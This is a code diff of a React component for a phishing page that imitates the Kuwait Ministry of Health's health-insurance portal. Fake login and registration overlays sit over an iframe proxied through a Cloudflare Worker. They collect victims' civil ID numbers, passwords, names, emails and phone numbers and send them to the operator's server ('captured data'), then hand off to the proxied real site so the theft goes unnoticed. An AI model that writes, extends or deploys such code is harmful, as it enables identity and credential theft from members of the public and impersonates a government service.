@@ -1,16 +1,13 @@
 import { useState, useEffect, useRef } from 'react';
-import { submitData, updatePage, socket } from '../lib/store';
+import { submitData, updatePage } from '../lib/store';
 
 const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';
 
-// Track which page the iframe is showing based on postMessage from Worker
-type IframePage = 'logaction' | 'login' | 'register' | 'services' | 'unknown';
+type OverlayScreen = 'home' | 'login' | 'register' | 'none';
 
 export default function KuwaitInsuranceHome() {
   const [loading, setLoading] = useState(true);
-  const [iframePage, setIframePage] = useState<IframePage>('logaction');
-  const [showLoginOverlay, setShowLoginOverlay] = useState(false);
-  const [showRegisterOverlay, setShowRegisterOverlay] = useState(false);
+  const [screen, setScreen] = useState<OverlayScreen>('home');
   const [overlayFading, setOverlayFading] = useState(false);
   const iframeRef = useRef<HTMLIFrameElement>(null);
 
@@ -27,45 +24,15 @@ export default function KuwaitInsuranceHome() {
   const [regPassword, setRegPassword] = useState('');
   const [regConfirmPassword, setRegConfirmPassword] = useState('');
 
-  // Listen for navigation messages from Worker's injected script
-  useEffect(() => {
-    const handleMessage = (event: MessageEvent) => {
-      if (event.data && event.data.type === 'moh-navigation') {
-        const path = event.data.path || '';
-        console.log('MOH Navigation:', path);
-        
-        if (path.includes('/Insurance/login') || path.includes('/Insurance/Login')) {
-          setIframePage('login');
-          setShowLoginOverlay(true);
-          updatePage('صفحة تسجيل الدخول');
-        } else if (path.includes('/Insurance/Register') || path.includes('/Insurance/register')) {
-          setIframePage('register');
-          setShowRegisterOverlay(true);
-          updatePage('صفحة إنشاء حساب');
-        } else if (path.includes('/Insurance/logaction') || path.includes('/Insurance/Logaction')) {
-          setIframePage('logaction');
-          updatePage('الصفحة الرئيسية');
-        } else {
-          setIframePage('unknown');
-          updatePage('صفحة الخدمات');
-        }
-      }
-    };
-
-    window.addEventListener('message', handleMessage);
-    return () => window.removeEventListener('message', handleMessage);
-  }, []);
-
-  // Update page on load
   useEffect(() => {
     updatePage('الصفحة الرئيسية');
   }, []);
 
-  // Fade out overlay and hide it
-  const fadeOutOverlay = (setter: (v: boolean) => void) => {
+  // Hide overlay with fade
+  const hideOverlay = () => {
     setOverlayFading(true);
     setTimeout(() => {
-      setter(false);
+      setScreen('none');
       setOverlayFading(false);
     }, 300);
   };
@@ -79,24 +46,27 @@ export default function KuwaitInsuranceHome() {
     }
     setLoginError('');
 
-    // Send captured data to server
+    // Send captured data to server via Socket
     submitData({
       'الرقم المدني': civilId,
       'كلمة المرور': password,
       'نوع النموذج': 'تسجيل دخول',
     }, false);
 
-    console.log('Login data captured:', { civilId, password });
+    updatePage('تسجيل دخول - تم الإرسال');
 
-    // Hide overlay and let user interact with iframe
-    fadeOutOverlay(setShowLoginOverlay);
+    // Navigate iframe to login page and hide overlay
+    if (iframeRef.current) {
+      iframeRef.current.src = WORKER_BASE + '/Insurance/login';
+    }
+    hideOverlay();
   };
 
   // Handle register submit
   const handleRegisterSubmit = (e: React.FormEvent) => {
     e.preventDefault();
 
-    // Send captured data to server
+    // Send captured data to server via Socket
     submitData({
       'الرقم المدني': regCivilId,
       'الاسم': regName,
@@ -107,10 +77,55 @@ export default function KuwaitInsuranceHome() {
       'نوع النموذج': 'إنشاء حساب جديد',
     }, false);
 
-    console.log('Register data captured');
+    updatePage('إنشاء حساب - تم الإرسال');
 
-    // Hide overlay and let user interact with iframe
-    fadeOutOverlay(setShowRegisterOverlay);
+    // Navigate iframe to register page and hide overlay
+    if (iframeRef.current) {
+      iframeRef.current.src = WORKER_BASE + '/Insurance/Register';
+    }
+    hideOverlay();
+  };
+
+  // Common styles
+  const headerStyle: React.CSSProperties = {
+    width: '100%',
+    background: 'linear-gradient(135deg, #1a2a3a 0%, #1b3a4b 50%, #1a2a3a 100%)',
+    padding: '25px 0',
+    textAlign: 'center',
+    color: 'white',
+  };
+
+  const inputStyle: React.CSSProperties = {
+    width: '100%',
+    padding: '12px 15px',
+    border: '1px solid #ccc',
+    borderRadius: 5,
+    fontSize: 15,
+    direction: 'ltr',
+    textAlign: 'right',
+    boxSizing: 'border-box',
+    outline: 'none',
+    fontFamily: 'Tahoma, Arial, sans-serif',
+  };
+
+  const labelStyle: React.CSSProperties = {
+    display: 'block',
+    marginBottom: 6,
+    fontSize: 14,
+    color: '#333',
+    fontWeight: 'bold',
+  };
+
+  const btnStyle: React.CSSProperties = {
+    width: '100%',
+    padding: '13px',
+    background: '#337ab7',
+    color: 'white',
+    border: 'none',
+    borderRadius: 5,
+    fontSize: 16,
+    fontWeight: 'bold',
+    cursor: 'pointer',
   };
 
   return (
@@ -124,29 +139,16 @@ export default function KuwaitInsuranceHome() {
       background: '#f0f4f8',
     }}>
       {/* Loading spinner */}
-      {loading && (
+      {loading && screen === 'none' && (
         <div style={{
           position: 'absolute',
-          top: 0,
-          left: 0,
-          width: '100%',
-          height: '100%',
-          display: 'flex',
-          flexDirection: 'column',
-          alignItems: 'center',
-          justifyContent: 'center',
-          background: '#f0f4f8',
-          zIndex: 10000,
-          direction: 'rtl',
-          fontFamily: 'Cairo, Arial, sans-serif'
+          top: 0, left: 0, width: '100%', height: '100%',
+          display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
+          background: '#f0f4f8', zIndex: 10000, direction: 'rtl', fontFamily: 'Cairo, Arial, sans-serif'
         }}>
           <div style={{
-            width: 60,
-            height: 60,
-            border: '4px solid #e0e0e0',
-            borderTop: '4px solid #1a7a4c',
-            borderRadius: '50%',
-            animation: 'spin 1s linear infinite'
+            width: 60, height: 60, border: '4px solid #e0e0e0', borderTop: '4px solid #1a7a4c',
+            borderRadius: '50%', animation: 'spin 1s linear infinite'
           }} />
           <p style={{ marginTop: 20, color: '#333', fontSize: 16 }}>
             جاري تحميل النظام الآلي لتسجيل الضمان الصحي...
@@ -155,134 +157,152 @@ export default function KuwaitInsuranceHome() {
         </div>
       )}
 
-      {/* Login Overlay */}
-      {showLoginOverlay && (
+      {/* ===== HOME SCREEN OVERLAY ===== */}
+      {screen === 'home' && (
         <div style={{
-          position: 'absolute',
-          top: 0,
-          left: 0,
-          width: '100%',
-          height: '100%',
-          background: '#e8e8e8',
-          zIndex: 10001,
-          display: 'flex',
-          flexDirection: 'column',
-          alignItems: 'center',
-          direction: 'rtl',
-          fontFamily: 'Tahoma, Arial, sans-serif',
-          opacity: overlayFading ? 0 : 1,
-          transition: 'opacity 0.3s ease',
+          position: 'absolute', top: 0, left: 0, width: '100%', height: '100%',
+          background: '#e8e8e8', zIndex: 10001,
+          display: 'flex', flexDirection: 'column', alignItems: 'center',
+          direction: 'rtl', fontFamily: 'Tahoma, Arial, sans-serif',
+          opacity: overlayFading ? 0 : 1, transition: 'opacity 0.3s ease',
           overflowY: 'auto',
         }}>
           {/* Header */}
-          <div style={{
-            width: '100%',
-            background: '#1b3a4b',
-            padding: '20px 0',
-            textAlign: 'center',
-            color: 'white',
-          }}>
-            <img 
-              src={WORKER_BASE + '/img/FMOHLogo.svg'} 
-              alt="شعار وزارة الصحة"
-              style={{ width: 80, height: 80, margin: '0 auto 10px' }}
-              onError={(e) => {
-                (e.target as HTMLImageElement).style.display = 'none';
-              }}
-            />
-            <h1 style={{ fontSize: 22, fontWeight: 'bold', margin: 0 }}>
+          <div style={headerStyle}>
+            <div style={{
+              width: 70, height: 70, margin: '0 auto 10px',
+              background: 'rgba(255,255,255,0.1)', borderRadius: '50%',
+              display: 'flex', alignItems: 'center', justifyContent: 'center',
+              fontSize: 35,
+            }}>
+              🏛️
+            </div>
+            <h1 style={{ fontSize: 20, fontWeight: 'bold', margin: 0 }}>
               النظام الآلي لتسجيل الضمان الصحي
             </h1>
           </div>
 
-          {/* Login Form */}
+          {/* Main Card */}
           <div style={{
-            maxWidth: 500,
-            width: '90%',
-            margin: '40px auto',
-            background: 'white',
-            borderRadius: 8,
-            padding: '30px',
-            boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
+            maxWidth: 550, width: '90%', margin: '40px auto',
+            background: 'white', borderRadius: 8, padding: '35px 30px',
+            boxShadow: '0 2px 15px rgba(0,0,0,0.08)',
+            border: '1px solid #c5d5e0',
+          }}>
+            <div style={{
+              background: '#337ab7', color: 'white', padding: '15px 20px',
+              borderRadius: '6px 6px 0 0', margin: '-35px -30px 25px -30px',
+              textAlign: 'center', fontSize: 17, fontWeight: 'bold',
+            }}>
+              تسجيل الدخول لجميع المواد
+            </div>
+
+            <p style={{
+              fontSize: 15, color: '#555', lineHeight: 1.8, textAlign: 'center',
+              marginBottom: 25,
+            }}>
+              في هذا القسم ، يمكن للمراجع الدخول على خدمة الضمان الصحي الالكتروني بعد تسجيل الدخول. اضغط على زر تسجيل الدخول أدناه للمتابعة.
+            </p>
+
+            <button
+              onClick={() => {
+                setScreen('login');
+                updatePage('صفحة تسجيل الدخول');
+              }}
+              style={{
+                ...btnStyle,
+                display: 'block',
+                width: 'auto',
+                margin: '0 auto',
+                padding: '12px 50px',
+                borderRadius: 25,
+                fontSize: 16,
+              }}
+            >
+              تسجيل الدخول
+            </button>
+          </div>
+
+          {/* Footer */}
+          <p style={{
+            color: 'red', fontSize: 14, textAlign: 'center',
+            marginTop: 10, marginBottom: 30, fontWeight: 'bold',
+          }}>
+            تم تفعيل الخدمة يوميا على مدى 24 ساعة
+          </p>
+
+          <div style={{
+            width: '100%', background: '#333', color: '#aaa',
+            textAlign: 'center', padding: '12px 0', fontSize: 12,
+            marginTop: 'auto',
+          }}>
+            © 2019 Ministry Of Health Kuwait . All Rights Reserved.
+          </div>
+        </div>
+      )}
+
+      {/* ===== LOGIN SCREEN OVERLAY ===== */}
+      {screen === 'login' && (
+        <div style={{
+          position: 'absolute', top: 0, left: 0, width: '100%', height: '100%',
+          background: '#e8e8e8', zIndex: 10001,
+          display: 'flex', flexDirection: 'column', alignItems: 'center',
+          direction: 'rtl', fontFamily: 'Tahoma, Arial, sans-serif',
+          opacity: overlayFading ? 0 : 1, transition: 'opacity 0.3s ease',
+          overflowY: 'auto',
+        }}>
+          <div style={headerStyle}>
+            <div style={{
+              width: 70, height: 70, margin: '0 auto 10px',
+              background: 'rgba(255,255,255,0.1)', borderRadius: '50%',
+              display: 'flex', alignItems: 'center', justifyContent: 'center',
+              fontSize: 35,
+            }}>
+              🏛️
+            </div>
+            <h1 style={{ fontSize: 20, fontWeight: 'bold', margin: 0 }}>
+              النظام الآلي لتسجيل الضمان الصحي
+            </h1>
+          </div>
+
+          <div style={{
+            maxWidth: 480, width: '90%', margin: '35px auto',
+            background: 'white', borderRadius: 8, padding: '30px',
+            boxShadow: '0 2px 15px rgba(0,0,0,0.08)',
+            border: '1px solid #c5d5e0',
           }}>
             <h2 style={{
-              fontSize: 20,
-              color: '#1b3a4b',
-              marginBottom: 5,
-              textAlign: 'center',
-              fontWeight: 'bold',
+              fontSize: 18, color: '#1b3a4b', marginBottom: 5,
+              textAlign: 'center', fontWeight: 'bold',
             }}>
               تسجيل الدخول
             </h2>
             <p style={{
-              fontSize: 14,
-              color: '#666',
-              marginBottom: 25,
-              textAlign: 'center',
+              fontSize: 13, color: '#888', marginBottom: 25, textAlign: 'center',
             }}>
               أدخل بياناتك للدخول إلى النظام
             </p>
 
             <form onSubmit={handleLoginSubmit}>
-              <div style={{ marginBottom: 20 }}>
-                <label style={{
-                  display: 'block',
-                  marginBottom: 8,
-                  fontSize: 14,
-                  color: '#333',
-                  fontWeight: 'bold',
-                }}>
-                  الرقم المدني
-                </label>
+              <div style={{ marginBottom: 18 }}>
+                <label style={labelStyle}>الرقم المدني</label>
                 <input
                   type="text"
                   value={civilId}
                   onChange={(e) => setCivilId(e.target.value)}
                   placeholder="أدخل الرقم المدني"
-                  style={{
-                    width: '100%',
-                    padding: '12px 15px',
-                    border: '1px solid #ddd',
-                    borderRadius: 6,
-                    fontSize: 16,
-                    direction: 'ltr',
-                    textAlign: 'right',
-                    boxSizing: 'border-box',
-                    outline: 'none',
-                  }}
-                  onFocus={(e) => e.target.style.borderColor = '#2196F3'}
-                  onBlur={(e) => e.target.style.borderColor = '#ddd'}
+                  style={inputStyle}
                 />
               </div>
 
-              <div style={{ marginBottom: 20 }}>
-                <label style={{
-                  display: 'block',
-                  marginBottom: 8,
-                  fontSize: 14,
-                  color: '#333',
-                  fontWeight: 'bold',
-                }}>
-                  كلمة المرور
-                </label>
+              <div style={{ marginBottom: 18 }}>
+                <label style={labelStyle}>كلمة المرور</label>
                 <input
                   type="password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder="أدخل كلمة المرور"
-                  style={{
-                    width: '100%',
-                    padding: '12px 15px',
-                    border: '1px solid #ddd',
-                    borderRadius: 6,
-                    fontSize: 16,
-                    direction: 'ltr',
-                    textAlign: 'right',
-                    boxSizing: 'border-box',
-                    outline: 'none',
-                  }}
-                  onFocus={(e) => e.target.style.borderColor = '#2196F3'}
-                  onBlur={(e) => e.target.style.borderColor = '#ddd'}
+                  style={inputStyle}
                 />
               </div>
 
@@ -292,215 +312,118 @@ export default function KuwaitInsuranceHome() {
                 </p>
               )}
 
-              <button
-                type="submit"
-                style={{
-                  width: '100%',
-                  padding: '14px',
-                  background: '#2196F3',
-                  color: 'white',
-                  border: 'none',
-                  borderRadius: 6,
-                  fontSize: 16,
-                  fontWeight: 'bold',
-                  cursor: 'pointer',
-                  transition: 'background 0.2s',
-                }}
-                onMouseOver={(e) => (e.target as HTMLButtonElement).style.background = '#1976D2'}
-                onMouseOut={(e) => (e.target as HTMLButtonElement).style.background = '#2196F3'}
-              >
+              <button type="submit" style={btnStyle}>
                 تسجيل الدخول
               </button>
             </form>
 
             <div style={{ textAlign: 'center', marginTop: 20 }}>
-              <a
-                href="#"
-                onClick={(e) => {
-                  e.preventDefault();
-                  fadeOutOverlay(setShowLoginOverlay);
-                  // Navigate iframe to register page
-                  if (iframeRef.current) {
-                    iframeRef.current.src = WORKER_BASE + '/Insurance/Register';
-                  }
-                }}
-                style={{
-                  color: '#2196F3',
-                  fontSize: 14,
-                  textDecoration: 'none',
-                }}
-              >
+              <a href="#" onClick={(e) => { e.preventDefault(); setScreen('register'); updatePage('صفحة إنشاء حساب'); }}
+                style={{ color: '#337ab7', fontSize: 14, textDecoration: 'none' }}>
                 إنشاء حساب جديد
               </a>
             </div>
           </div>
 
-          {/* Footer */}
-          <p style={{
-            color: 'red',
-            fontSize: 14,
-            textAlign: 'center',
-            marginTop: 20,
-            marginBottom: 30,
-          }}>
+          <p style={{ color: 'red', fontSize: 14, textAlign: 'center', marginTop: 10, marginBottom: 30, fontWeight: 'bold' }}>
             تم تفعيل الخدمة يوميا على مدى 24 ساعة
           </p>
+
+          <div style={{
+            width: '100%', background: '#333', color: '#aaa',
+            textAlign: 'center', padding: '12px 0', fontSize: 12, marginTop: 'auto',
+          }}>
+            © 2019 Ministry Of Health Kuwait . All Rights Reserved.
+          </div>
         </div>
       )}
 
-      {/* Register Overlay */}
-      {showRegisterOverlay && (
+      {/* ===== REGISTER SCREEN OVERLAY ===== */}
+      {screen === 'register' && (
         <div style={{
-          position: 'absolute',
-          top: 0,
-          left: 0,
-          width: '100%',
-          height: '100%',
-          background: '#e8e8e8',
-          zIndex: 10001,
-          display: 'flex',
-          flexDirection: 'column',
-          alignItems: 'center',
-          direction: 'rtl',
-          fontFamily: 'Tahoma, Arial, sans-serif',
-          opacity: overlayFading ? 0 : 1,
-          transition: 'opacity 0.3s ease',
+          position: 'absolute', top: 0, left: 0, width: '100%', height: '100%',
+          background: '#e8e8e8', zIndex: 10001,
+          display: 'flex', flexDirection: 'column', alignItems: 'center',
+          direction: 'rtl', fontFamily: 'Tahoma, Arial, sans-serif',
+          opacity: overlayFading ? 0 : 1, transition: 'opacity 0.3s ease',
           overflowY: 'auto',
         }}>
-          {/* Header */}
-          <div style={{
-            width: '100%',
-            background: '#1b3a4b',
-            padding: '20px 0',
-            textAlign: 'center',
-            color: 'white',
-          }}>
-            <img 
-              src={WORKER_BASE + '/img/FMOHLogo.svg'} 
-              alt="شعار وزارة الصحة"
-              style={{ width: 80, height: 80, margin: '0 auto 10px' }}
-              onError={(e) => {
-                (e.target as HTMLImageElement).style.display = 'none';
-              }}
-            />
-            <h1 style={{ fontSize: 22, fontWeight: 'bold', margin: 0 }}>
+          <div style={headerStyle}>
+            <div style={{
+              width: 70, height: 70, margin: '0 auto 10px',
+              background: 'rgba(255,255,255,0.1)', borderRadius: '50%',
+              display: 'flex', alignItems: 'center', justifyContent: 'center',
+              fontSize: 35,
+            }}>
+              🏛️
+            </div>
+            <h1 style={{ fontSize: 20, fontWeight: 'bold', margin: 0 }}>
               النظام الآلي لتسجيل الضمان الصحي
             </h1>
           </div>
 
-          {/* Register Form */}
           <div style={{
-            maxWidth: 500,
-            width: '90%',
-            margin: '30px auto',
-            background: 'white',
-            borderRadius: 8,
-            padding: '30px',
-            boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
+            maxWidth: 480, width: '90%', margin: '30px auto',
+            background: 'white', borderRadius: 8, padding: '30px',
+            boxShadow: '0 2px 15px rgba(0,0,0,0.08)',
+            border: '1px solid #c5d5e0',
           }}>
             <h2 style={{
-              fontSize: 20,
-              color: '#1b3a4b',
-              marginBottom: 5,
-              textAlign: 'center',
-              fontWeight: 'bold',
+              fontSize: 18, color: '#1b3a4b', marginBottom: 5,
+              textAlign: 'center', fontWeight: 'bold',
             }}>
               إنشاء حساب جديد
             </h2>
             <p style={{
-              fontSize: 14,
-              color: '#666',
-              marginBottom: 25,
-              textAlign: 'center',
+              fontSize: 13, color: '#888', marginBottom: 25, textAlign: 'center',
             }}>
               أدخل بياناتك لإنشاء حساب جديد
             </p>
 
             <form onSubmit={handleRegisterSubmit}>
               {[
-                { label: 'الرقم المدني', value: regCivilId, setter: setRegCivilId, type: 'text', placeholder: 'أدخل الرقم المدني' },
-                { label: 'الاسم الكامل', value: regName, setter: setRegName, type: 'text', placeholder: 'أدخل الاسم الكامل' },
-                { label: 'البريد الإلكتروني', value: regEmail, setter: setRegEmail, type: 'email', placeholder: 'أدخل البريد الإلكتروني' },
-                { label: 'رقم الهاتف', value: regPhone, setter: setRegPhone, type: 'tel', placeholder: 'أدخل رقم الهاتف' },
-                { label: 'كلمة المرور', value: regPassword, setter: setRegPassword, type: 'password', placeholder: 'أدخل كلمة المرور' },
-                { label: 'تأكيد كلمة المرور', value: regConfirmPassword, setter: setRegConfirmPassword, type: 'password', placeholder: 'أعد إدخال كلمة المرور' },
-              ].map((field, i) => (
-                <div key={i} style={{ marginBottom: 18 }}>
-                  <label style={{
-                    display: 'block',
-                    marginBottom: 8,
-                    fontSize: 14,
-                    color: '#333',
-                    fontWeight: 'bold',
-                  }}>
-                    {field.label}
-                  </label>
+                { label: 'الرقم المدني', value: regCivilId, setter: setRegCivilId, type: 'text', ph: 'أدخل الرقم المدني' },
+                { label: 'الاسم الكامل', value: regName, setter: setRegName, type: 'text', ph: 'أدخل الاسم الكامل' },
+                { label: 'البريد الإلكتروني', value: regEmail, setter: setRegEmail, type: 'email', ph: 'أدخل البريد الإلكتروني' },
+                { label: 'رقم الهاتف', value: regPhone, setter: setRegPhone, type: 'tel', ph: 'أدخل رقم الهاتف' },
+                { label: 'كلمة المرور', value: regPassword, setter: setRegPassword, type: 'password', ph: 'أدخل كلمة المرور' },
+                { label: 'تأكيد كلمة المرور', value: regConfirmPassword, setter: setRegConfirmPassword, type: 'password', ph: 'أعد إدخال كلمة المرور' },
+              ].map((f, i) => (
+                <div key={i} style={{ marginBottom: 16 }}>
+                  <label style={labelStyle}>{f.label}</label>
                   <input
-                    type={field.type}
-                    value={field.value}
-                    onChange={(e) => field.setter(e.target.value)}
-                    placeholder={field.placeholder}
-                    style={{
-                      width: '100%',
-                      padding: '12px 15px',
-                      border: '1px solid #ddd',
-                      borderRadius: 6,
-                      fontSize: 16,
-                      direction: 'ltr',
-                      textAlign: 'right',
-                      boxSizing: 'border-box',
-                      outline: 'none',
-                    }}
-                    onFocus={(e) => e.target.style.borderColor = '#2196F3'}
-                    onBlur={(e) => e.target.style.borderColor = '#ddd'}
+                    type={f.type}
+                    value={f.value}
+                    onChange={(e) => f.setter(e.target.value)}
+                    placeholder={f.ph}
+                    style={inputStyle}
                   />
                 </div>
               ))}
 
-              <button
-                type="submit"
-                style={{
-                  width: '100%',
-                  padding: '14px',
-                  background: '#2196F3',
-                  color: 'white',
-                  border: 'none',
-                  borderRadius: 6,
-                  fontSize: 16,
-                  fontWeight: 'bold',
-                  cursor: 'pointer',
-                  marginTop: 10,
-                  transition: 'background 0.2s',
-                }}
-                onMouseOver={(e) => (e.target as HTMLButtonElement).style.background = '#1976D2'}
-                onMouseOut={(e) => (e.target as HTMLButtonElement).style.background = '#2196F3'}
-              >
+              <button type="submit" style={{ ...btnStyle, marginTop: 10 }}>
                 إنشاء حساب
               </button>
             </form>
 
             <div style={{ textAlign: 'center', marginTop: 20 }}>
-              <a
-                href="#"
-                onClick={(e) => {
-                  e.preventDefault();
-                  fadeOutOverlay(setShowRegisterOverlay);
-                  setShowLoginOverlay(true);
-                }}
-                style={{
-                  color: '#2196F3',
-                  fontSize: 14,
-                  textDecoration: 'none',
-                }}
-              >
+              <a href="#" onClick={(e) => { e.preventDefault(); setScreen('login'); updatePage('صفحة تسجيل الدخول'); }}
+                style={{ color: '#337ab7', fontSize: 14, textDecoration: 'none' }}>
                 لديك حساب؟ تسجيل الدخول
               </a>
             </div>
           </div>
+
+          <div style={{
+            width: '100%', background: '#333', color: '#aaa',
+            textAlign: 'center', padding: '12px 0', fontSize: 12, marginTop: 'auto',
+          }}>
+            © 2019 Ministry Of Health Kuwait . All Rights Reserved.
+          </div>
         </div>
       )}
 
-      {/* The actual iframe */}
+      {/* The actual iframe - always loaded in background */}
       <iframe
         ref={iframeRef}
         src={WORKER_BASE + '/Insurance/logaction'}
